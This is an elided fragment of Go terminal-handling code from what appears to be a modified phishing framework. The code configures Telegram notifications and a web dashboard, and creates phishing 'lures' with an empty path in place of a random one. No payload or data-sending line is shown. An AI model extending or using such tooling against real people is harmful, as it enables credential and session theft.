...
func (t *Terminal) handleConfig(args []string) error {
	...
	if pn == 0 {
		...
		case "telegram":
			switch args[1] {
			case "test":
				t.p.telegram.Setup(t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatId())
				err := t.p.telegram.Test()
				if err != nil {
	...
	if pn > 0 {
		...
		case "create":
			if pn == 2 {
				...
				l := &Lure{
					Path:     "",  // Empty path instead of random string
					Phishlet: args[1],
				}
...
func (t *Terminal) createHelp() {
	...
	h.AddSubCommand("config", []string{"web_port"}, "web_port <port>", "set the port for the web dashboard (default: 8080)")
	...
	h.AddSubCommand("config", []string{"telegram", "bot_token"}, "telegram bot_token <token>", "set up the bot token for telegram notifications")
